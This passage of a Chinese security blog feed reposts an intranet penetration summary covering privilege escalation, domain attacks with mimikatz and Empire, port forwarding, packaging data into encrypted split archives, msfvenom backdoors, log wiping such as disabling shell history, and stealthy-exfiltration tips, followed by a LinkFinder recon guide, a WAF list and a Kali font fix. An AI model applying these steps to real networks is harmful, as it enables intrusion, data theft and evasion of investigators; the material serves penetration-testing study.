rel="noopener">https://www.anquanke.com/post/id/85343</a></li><li><a href="https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html" target="_blank" rel="noopener">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</a></li></ul><h3 id="2-7-3-Hive"><a href="#2-7-3-Hive" class="headerlink" title="2.7.3 Hive"></a>2.7.3 Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p><p>参考：</p><ul><li><a href="https://cwiki.apache.org/confluence/display/Hive/Security" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/Hive/Security</a></li><li><a href="https://www.cnblogs.com/yejibigdata/p/6394719.html" target="_blank" rel="noopener">https://www.cnblogs.com/yejibigdata/p/6394719.html</a></li></ul><h3 id="2-7-4-Sqoop"><a href="#2-7-4-Sqoop" class="headerlink" title="2.7.4 Sqoop"></a>2.7.4 Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p><p>参考</p><ul><li><a href="https://sqoop.apache.org/docs/1.99.7/security.html" target="_blank" rel="noopener">https://sqoop.apache.org/docs/1.99.7/security.html</a></li></ul><h3 id="2-7-5-HBase"><a href="#2-7-5-HBase" class="headerlink" title="2.7.5 HBase"></a>2.7.5 HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p><p>参考：</p><ul><li><a href="https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html" target="_blank" rel="noopener">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</a></li><li><a href="http://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html" target="_blank" rel="noopener">http://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</a></li></ul><h3 id="2-7-6-Spark"><a href="#2-7-6-Spark" class="headerlink" title="2.7.6 Spark"></a>2.7.6 Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p><p>参考：</p><ul><li><a href="http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905" target="_blank" rel="noopener">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</a></li></ul><h1 id="0x03-后渗透"><a href="#0x03-后渗透" class="headerlink" title="0x03 后渗透"></a>0x03 后渗透</h1><h2 id="3-1-提权"><a href="#3-1-提权" class="headerlink" title="3.1 提权"></a>3.1 提权</h2><p>SecWiki 总结了：</p><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li><li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li></ul><h2 id="3-2-域攻击"><a href="#3-2-域攻击" class="headerlink" title="3.2 域攻击"></a>3.2 域攻击</h2><p>通常域内渗透的过程</p><ol><li>确定目标系统和应用程序</li><li>识别潜在的漏洞</li><li>利用漏洞获得初始访问</li><li>提升权限</li><li>定位域管理进程或者获取远程系统上的本地身份验证令牌</li><li>通过本地管理员的密码Hash，破解密码，使用mimikatz工具抓取密码验证运行在远程系统上的域名管理进程</li><li>迁移域管理进程</li><li>创建一个域管理员</li></ol><p>假设到这里已经从外网或内网利用漏洞入侵到到一台服务器，并且通过提权获取了主机管理员权限，接下来要做的工作是获取域管理员权限，并找到敏感数据。</p><p>通常会使用到的工具：</p><ol><li>Empire</li><li>PowerUp</li><li>PowerView</li></ol><p>一般熟练使用一种就够用了，以 Empire 为例：<br>Empire 和 Metasploit 的使用原理是一样的，都是先设置一个监听，然后去生成一个木马，然后在目标主机运行该木马，我们的监听就会连接上反弹回来的代理。</p><p>参考：</p><ul><li><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87328</a></li><li><a href="http://www.4hou.com/technology/4704.html" target="_blank" rel="noopener">http://www.4hou.com/technology/4704.html</a></li></ul><p>域渗透另外一个工具 mimikatz，用于抓 Windows 密码，使用参考：</p><ul><li><a href="http://www.mottoin.com/98506.html" target="_blank" rel="noopener">http://www.mottoin.com/98506.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/34991269" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34991269</a></li></ul><h2 id="3-3-建立后门-端口转发"><a href="#3-3-建立后门-端口转发" class="headerlink" title="3.3 建立后门/端口转发"></a>3.3 建立后门/端口转发</h2><p>参考：</p><ul><li><a href="http://www.zerokeeper.com/experience/network-port-forwarding-and-penetration.html" target="_blank" rel="noopener">http://www.zerokeeper.com/experience/network-port-forwarding-and-penetration.html</a></li><li><a href="https://1sparrow.com/2018/01/20/端口转发总结/" target="_blank" rel="noopener">https://1sparrow.com/2018/01/20/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/</a></li><li><a href="http://drops.xmd5.com/static/drops/tools-15000.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tools-15000.html</a></li></ul><p>端口转发及代理类工具</p><ul><li>LCX：windows下面的端口转发软件。</li><li>sockscap：主要针对windows平台的端口转发和代理转发。</li><li>proxifier：跨平台的端口转发和代理工具，适用windows，linux，<br>Macos平台，代理转发利器</li><li>Rsscoks：＊nix平台下的端口转发和代理工具，配合proxychains好用<br>到不行。</li><li>Proxychains：＊nix平台下老牌的socks代理工具，一般的系统都会自<br>带，谁用谁知道。</li><li>ssh proxy：通过ssh做端口代理和转发，一般＊nix系统都自带。</li><li>netcat：socat，hping，在很多情况下可以做端口转发和数据代理转<br>发。</li><li>metasploit：metasploit的后渗透模块中有不少代理模块和端口转发<br>模块。</li></ul><p>在中转服务器上下载端口转发工具（加密压缩）：</p><ul><li>能连接互联网下载</li><li>通过 mstsc 的磁盘加载</li><li>通过入口服务器中转</li><li>通过远程控制软件上传</li></ul><h2 id="3-4-传输文件"><a href="#3-4-传输文件" class="headerlink" title="3.4 传输文件"></a>3.4 传输文件</h2><h3 id="3-4-1-文件打包"><a href="#3-4-1-文件打包" class="headerlink" title="3.4.1 文件打包"></a>3.4.1 文件打包</h3><p>关于打包</p><ul><li><p>Rar文件打包，压缩d:\data\目录下所有2013-01-01后修改的doc文件，100M/包密码为Pass，-x为排除选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar.exe a–r –v100m new.rar –ta20130101000000 –hpPass –n*.doc –x*.exe d:\data\</span><br></pre></td></tr></table></figure></li><li><p>7z加密，压缩d:\data下所有文件，密码为Pass，分卷100M/包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z.exe a c:\xx.7z -pPass -mhe d:\data -v100m</span><br></pre></td></tr></table></figure></li><li><p>Linux用 tar 打包文件是可以加密码，要跟openssl结合使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf - pma|openssl des3 -salt -k password | dd of=pma.des3</span><br></pre></td></tr></table></figure><ul><li><p>使用 tar 对加密文件解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=pma.des3 |openssl des3 -d -k password|tar zxf -</span><br></pre></td></tr></table></figure><p>### 3.4.2 文件传输</p><p>几个思路</p></li></ul></li><li><p>使用端口转发直接传送数据；</p></li><li><p>搭建 FTP、HTTP 协议；</p></li><li><p>上传到云端再下载；</p></li></ul><h2 id="3-5-制作后门-木马程序"><a href="#3-5-制作后门-木马程序" class="headerlink" title="3.5 制作后门/木马程序"></a>3.5 制作后门/木马程序</h2><p>一般用Matisploit 的 msfvenom，使用参考：</p><ul><li><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a></li><li><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a></li></ul><p>SET 也可以生成后门程序，另外也可以关注一下最新的 Office、PDF 的漏洞</p><h1 id="0x04-日志清理"><a href="#0x04-日志清理" class="headerlink" title="0x04 日志清理"></a>0x04 日志清理</h1><p>这部分对于安全检查、或授权渗透测试工作不是重点，通常也不考虑。</p><p>在做日志清理前需要了解以下的内容：</p><ul><li>攻击和入侵很难完全删除痕迹，没有日志记录本身就是一种入侵特征；</li><li>删除或清理入侵系统的本地日志不代表删除了痕迹，在网络设备、安全设备、集中化日志系统上仍然留存记录；</li><li>留存的后门本身会有攻击者的信息；</li><li>使用的代理或跳板可能会被反向入侵;</li><li>在操作前检查是否有管理员登录；</li><li>删除上传的工具，使用磁盘覆写的功能删除；</li></ul><p>Windows日志类型</p><ul><li>web日志：IIS、Apache以及其它web日志</li><li>操作日志：3389登录列表、最近访问文件、IE等浏览<br>器访问日志、文件访问日志</li><li>登陆日志：系统应用日志-安全日志等</li><li>攻击前和状态还原，尽量保持一致</li></ul><p>Linux操作日志</p><ul><li><p>Linux历史操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</span><br></pre></td></tr></table></figure></li><li><p>SSHD登陆记录<br>删除~/.ssh/known_hosts中记录</p></li><li><p>修改文件时间戳<br>touch –r 原文件要修改文件</p></li><li><p>删除临时使用文件，尤其是tmp目录</p></li><li><p><a href="https://github.com/border/wifihack/tree/master/bin/logtamper" target="_blank" rel="noopener">logtamper</a></p></li></ul><h1 id="0x05-工具和其他"><a href="#0x05-工具和其他" class="headerlink" title="0x05 工具和其他"></a>0x05 工具和其他</h1><ol><li>内网使用工具渗透的一些原则<ul><li>使用适合自己的工具，工具没必要收集太多，够用就行；</li><li>能根据实际情况编写适用的工具；</li><li>不能确保安全的工具均要在虚拟机中运行（很<br>多捆绑病毒木马）；</li><li>做安全检查的话，尽量使用 GitHub 上开源的工具。</li></ul></li><li>工具介绍<br>个人习惯使用 kali 自带工具，特定 POC 先从 Github 上搜索。<br>推荐一个工具介绍的网站：<a href="https://www.kitploit.com/" target="_blank" rel="noopener">https://www.kitploit.com/</a></li><li>渗透注意事项<ul><li>检查内网监控防范系统</li><li>谨慎使用ARP软件和大面积扫描软件</li><li>使用目标网络中无空闲机器，作为打包对象</li><li>使用内网大流量机器作为传输对象，如wsus服务<br>器、视频会议系统</li><li>使用临时机器打包、数据传输，不要使用已控机器，可利用wmi脚本或wmic远程操作<br>渗透注意事项</li><li>禁止使用psexec.exe</li><li>打包时避开用户工作时间</li><li>控制卷包大小&lt;100M</li><li>选择用户常用压缩软件</li><li>错峰下载数据</li><li>控制传输流量</li><li>清除所有操作日志</li><li>登录主机前先看看管理员是否在</li></ul></li></ol><p>感谢大佬们的总结</p><ul><li><a href="http://www.91ri.org/15441.html" target="_blank" rel="noopener">http://www.91ri.org/15441.html</a></li><li><a href="https://paper.seebug.org/126/" target="_blank" rel="noopener">https://paper.seebug.org/126/</a></li><li><a href="https://paper.seebug.org/409/" target="_blank" rel="noopener">https://paper.seebug.org/409/</a></li><li>DC010 上海站 演讲ppt《5内网渗透思路（陈小兵）.pdf》</li></ul><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今日，和往常一样在网上浏览一些大牛写的技术文章，来填充自己的知识空白，于是看到了先知社区上的这篇&lt;a href=&quot;https://xz.aliyun.com/t/2354#toc-53&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《内网安全检查/渗透总结》&lt;/a&gt;，看到这篇文章我就被深深的震撼了，总结的太好了，对于我这个菜鸟来说，填补了我不少知识空白。所以这里转载保存，方便他日继续消化。&lt;/p&gt;
    
    </summary>
    
      <category term="内网安全" scheme="https://www.mad-coding.cn/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="内网" scheme="https://www.mad-coding.cn/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>JS文件信息收集工具-LinkFinder</title>
    <link href="https://www.mad-coding.cn/2019/12/23/JS%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7-LinkFinder/"/>
    <id>https://www.mad-coding.cn/2019/12/23/JS文件信息收集工具-LinkFinder/</id>
    <published>2019-12-23T02:59:13.000Z</published>
    <updated>2019-12-31T02:20:35.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们在渗透测试的之前，信息收集是必要的步骤，而JS文件中往往会暴露出很多的信息，比如一些注释的中铭感信息，内网ip地址泄露等等，还会有一些绝对路径或者相对路径的url，而这些url中很有可能就存在着一些未授权访问或者其他更高级的漏洞，但是手动的去一个个查看的效率太过于地下，所以这里分享一个JS文件的信息收集工具——LinkFinder</p><a id="more"></a><h1 id="0x01-LinkFinder介绍"><a href="#0x01-LinkFinder介绍" class="headerlink" title="0x01 LinkFinder介绍"></a>0x01 LinkFinder介绍</h1><p>LinkFinder是一个Python脚本，旨在发现JavaScript文件中的端点及其参数。这样，渗透测试人员和Bug猎手就可以在他们正在测试的网站上收集新的，隐藏的端点。导致新的测试环境，可能包含新的漏洞。它通过将<a href="https://github.com/beautify-web/js-beautify" target="_blank" rel="noopener">jsbeautifier</a> for python与相当大的正则表达式结合使用来实现。正则表达式由四个小的正则表达式组成。这些负责查找：</p><ul><li>完整网址（<code>https://example.com/*</code>）</li><li>绝对URL或点分URL（<code>/\*</code>或<code>../*</code>）</li><li>带有至少一个斜杠（<code>text/test.php</code>）的相对URL</li><li>相对网址，不带斜线（<code>test.php</code>）</li></ul><p>输出以HTML或纯文本形式给出</p><h1 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h1><h2 id="2-1-手动安装"><a href="#2-1-手动安装" class="headerlink" title="2.1 手动安装"></a>2.1 手动安装</h2><p>克隆到本地安装</p><p>LinkFinder支持<strong>Python 3</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/GerbenJavado/LinkFinder.git</span><br><span class="line">$ cd LinkFinder</span><br><span class="line">$ python setup.py install</span><br></pre></td></tr></table></figure><p>解决依赖关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="2-2-Docker一键安装"><a href="#2-2-Docker一键安装" class="headerlink" title="2.2 Docker一键安装"></a>2.2 Docker一键安装</h2><ul><li><p>创建docker镜像</p><p><code>docker build -t linkfinder</code></p></li><li><p>运行docker</p><p><code>docker run --rm -v $(pwd):/linkfinder/output linkfinder -i http://example.com/1.js -o /linkfinder/output/output.html</code></p><p>确保使用的``/linkfinder/output` 路径在你的输出路径，</p></li></ul><h1 id="0x03-使用方法"><a href="#0x03-使用方法" class="headerlink" title="0x03 使用方法"></a>0x03 使用方法</h1><h2 id="3-1-参数解释"><a href="#3-1-参数解释" class="headerlink" title="3.1 参数解释"></a>3.1 参数解释</h2><table><thead><tr><th>Short Form</th><th>Long Form</th><th>Description</th></tr></thead><tbody><tr><td>-i</td><td>–input</td><td>输入一个URL，文件或者文件夹，js文件必须要以.js后缀结尾</td></tr><tr><td>-o</td><td>–output</td><td>默认是以html的结果输出，也可以使用命令行的形式输出</td></tr><tr><td>-r</td><td>–regex</td><td>使用正则快速的筛选我们需要的信息 (e.g. ^/api/)</td></tr><tr><td>-d</td><td>–domain</td><td>Toggle to use when analyzing an entire domain. Enumerates over all found JS files.</td></tr><tr><td>-b</td><td>–burp</td><td>Toggle to use when inputting a Burp ‘Save selected’ file containing multiple JS files</td></tr><tr><td>-c</td><td>–cookies</td><td>Add cookies to the request</td></tr><tr><td>-h</td><td>–help</td><td>show the help message and exit</td></tr></tbody></table><h2 id="3-2-使用示例"><a href="#3-2-使用示例" class="headerlink" title="3.2 使用示例"></a>3.2 使用示例</h2><ul><li>在在线JavaScript文件中查找端点并将HTML结果输出到results.html的最基本用法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linkfinder.py -i https://example.com/1.js -o results.html</span><br></pre></td></tr></table></figure><ul><li>CLI / STDOUT输出（不使用jsbeautifier，这使其非常快）：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linkfinder.py -i https://example.com/1.js -o cli</span><br></pre></td></tr></table></figure><ul><li>分析整个域及其JS文件：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linkfinder.py -i https://example.com -d</span><br></pre></td></tr></table></figure><ul><li>打p输入（在目标中选择要保存的文件，右键单击，然后<code>Save selected items</code>将该文件作为输入）：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linkfinder.py -i burpfile -b</span><br></pre></td></tr></table></figure><ul><li>枚举JavaScript文件的整个文件夹，同时查找以/ api /开头的端点，最后将结果保存到results.html中：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linkfinder.py -i &apos;Desktop/*.js&apos; -r ^/api/ -o results.html</span><br></pre></td></tr></table></figure><h1 id="0x04-使用截图"><a href="#0x04-使用截图" class="headerlink" title="0x04 使用截图"></a>0x04 使用截图</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191223153828.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;我们在渗透测试的之前，信息收集是必要的步骤，而JS文件中往往会暴露出很多的信息，比如一些注释的中铭感信息，内网ip地址泄露等等，还会有一些绝对路径或者相对路径的url，而这些url中很有可能就存在着一些未授权访问或者其他更高级的漏洞，但是手动的去一个个查看的效率太过于地下，所以这里分享一个JS文件的信息收集工具——LinkFinder&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="LinkFinder" scheme="https://www.mad-coding.cn/tags/LinkFinder/"/>
    
  </entry>
  
  <entry>
    <title>waf的识别与绕过（不断补充）</title>
    <link href="https://www.mad-coding.cn/2019/12/19/waf%E7%9A%84%E8%AF%86%E5%88%AB%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%88%E4%B8%8D%E6%96%AD%E8%A1%A5%E5%85%85%EF%BC%89/"/>
    <id>https://www.mad-coding.cn/2019/12/19/waf的识别与绕过（不断补充）/</id>
    <published>2019-12-19T01:37:33.000Z</published>
    <updated>2019-12-19T01:58:48.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们在渗透测试的过程中，一般大型的网站都会有waf等安全设备，对于我这种脚本小子来说，一下子就“萎了”，所以这里记载下常见的waf，以及一些常见的绕过方式，相关资料收集于互联网，如有侵权，请与我联系。</p><a id="more"></a><h1 id="0x01-安全狗"><a href="#0x01-安全狗" class="headerlink" title="0x01 安全狗"></a>0x01 安全狗</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219094959.png" class="lozad"></p><h1 id="0x02-D盾"><a href="#0x02-D盾" class="headerlink" title="0x02 D盾"></a>0x02 D盾</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219094949.png" class="lozad"></p><h1 id="0x03-亚信安全（deep-dege）"><a href="#0x03-亚信安全（deep-dege）" class="headerlink" title="0x03 亚信安全（deep dege）"></a>0x03 亚信安全（deep dege）</h1><h1 id="0x04-yxlink-waf"><a href="#0x04-yxlink-waf" class="headerlink" title="0x04 yxlink waf"></a>0x04 yxlink waf</h1><h1 id="0x05-创宇盾"><a href="#0x05-创宇盾" class="headerlink" title="0x05 创宇盾"></a>0x05 创宇盾</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095224.png" class="lozad"></p><h1 id="0x06-玄武盾"><a href="#0x06-玄武盾" class="headerlink" title="0x06 玄武盾"></a>0x06 玄武盾</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095239.png" class="lozad"></p><h1 id="0x07-腾讯门神"><a href="#0x07-腾讯门神" class="headerlink" title="0x07 腾讯门神"></a>0x07 腾讯门神</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095248.png" class="lozad"></p><h1 id="0x08-阿里云"><a href="#0x08-阿里云" class="headerlink" title="0x08 阿里云"></a>0x08 阿里云</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095258.png" class="lozad"></p><h1 id="0x09-网防G01"><a href="#0x09-网防G01" class="headerlink" title="0x09 网防G01"></a>0x09 网防G01</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095322.png" class="lozad"></p><h1 id="0x10-wts-waf"><a href="#0x10-wts-waf" class="headerlink" title="0x10 wts-waf"></a>0x10 wts-waf</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095457.png" class="lozad"></p><p>#0x11 Webknight</p><p>#0x12 ModSecurity</p><h1 id="0x13长亭safeline"><a href="#0x13长亭safeline" class="headerlink" title="0x13长亭safeline"></a>0x13长亭safeline</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219094701.png" class="lozad"></p><h1 id="0x14-openRasp"><a href="#0x14-openRasp" class="headerlink" title="0x14 openRasp"></a>0x14 openRasp</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219094729.png" class="lozad"></p><h1 id="0x15-F5-waf"><a href="#0x15-F5-waf" class="headerlink" title="0x15 F5 waf"></a>0x15 F5 waf</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219094910.png" class="lozad"></p><h1 id="0x16-南京铱讯-waf"><a href="#0x16-南京铱讯-waf" class="headerlink" title="0x16 南京铱讯 waf"></a>0x16 南京铱讯 waf</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095041.png" class="lozad"></p><h1 id="0x17-网宿云waf"><a href="#0x17-网宿云waf" class="headerlink" title="0x17 网宿云waf"></a>0x17 网宿云waf</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191219095536.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;我们在渗透测试的过程中，一般大型的网站都会有waf等安全设备，对于我这种脚本小子来说，一下子就“萎了”，所以这里记载下常见的waf，以及一些常见的绕过方式，相关资料收集于互联网，如有侵权，请与我联系。&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="https://www.mad-coding.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="waf" scheme="https://www.mad-coding.cn/tags/waf/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux 2019.4解决中文乱码问题</title>
    <link href="https://www.mad-coding.cn/2019/12/03/Kali-Linux-2019-4%E8%A7%A3%E5%86%B3%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/"/>
    <id>https://www.mad-coding.cn/2019/12/03/Kali-Linux-2019-4解决中文乱码问题/</id>
    <published>2019-12-03T08:52:06.000Z</published>
    <updated>2019-12-03T08:59:53.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Kali Linux不用多说，知道的人都知道，国外的一个渗透测试系统，集成了很多的渗透工具，最近跟新了2019.4但是很多小伙伴安装后显示有中文乱码问题，这里教大家如何解决。</p><a id="more"></a><h1 id="0x01-更换Kali-清华大学源"><a href="#0x01-更换Kali-清华大学源" class="headerlink" title="0x01 更换Kali 清华大学源"></a>0x01 更换Kali 清华大学源</h1><p>使用vim编辑器修改：vim /etc/apt/sources.list添加Kali 清华大学源使用mousepad编辑器修改：mousepad /etc/apt/sources.list添Kali 清华大学源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#清华大学 [更新源]</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165537.png" class="lozad"></p><p>编辑结束保存文件，终端中输入下面的命令</p><blockquote><p>apt-get clean &amp;&amp; apt-get update -y</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165601.png" class="lozad"></p><h1 id="0x02-安装字体"><a href="#0x02-安装字体" class="headerlink" title="0x02 安装字体"></a>0x02 安装字体</h1><p>在终端中输入下面的命令，安装开源的文泉驿微米黑和文泉驿正黑字体</p><blockquote><p>sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-intl-chinese</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165704.png" class="lozad"></p><h1 id="0x03-更改默认编码"><a href="#0x03-更改默认编码" class="headerlink" title="0x03 更改默认编码"></a>0x03 更改默认编码</h1><p>在终端中输入<code>dpkg-reconfigure locales</code></p><p>进入图形化界面之后，选中<code>1en_US.UTF-8 UTF-81</code>和<code>zh_CN.UTF-8 UTF-8</code>，空格是选择，<code>Tab</code>是切换，<code>*</code>是选中）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165754.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165758.png" class="lozad"></p><p>确定后，将zh_CN.UTF-8 UTF-8选为默认。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165809.png" class="lozad"></p><blockquote><p>dpkg-reconfigure locales</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165813.png" class="lozad"></p><h1 id="0x04-重启"><a href="#0x04-重启" class="headerlink" title="0x04 重启"></a>0x04 重启</h1><p>输入<code>reboot</code>命令，重启kali后，一切显示正常。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191203165911.png" class="lozad"></p><p>#0x05 参考：</p><p>参考群里大佬的分享。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Kali Linux不用多说，知道的人都知道，国外的一个渗透测试系统，集成了很多的渗透工具，最近跟新了2019.4但是很多小伙伴安装后显示有中文乱码问题，这里教大家如何解决。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="kali" scheme="https://www.mad-coding.cn/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>使用腾讯SCF+onedrive搭建5T个人网盘</title>
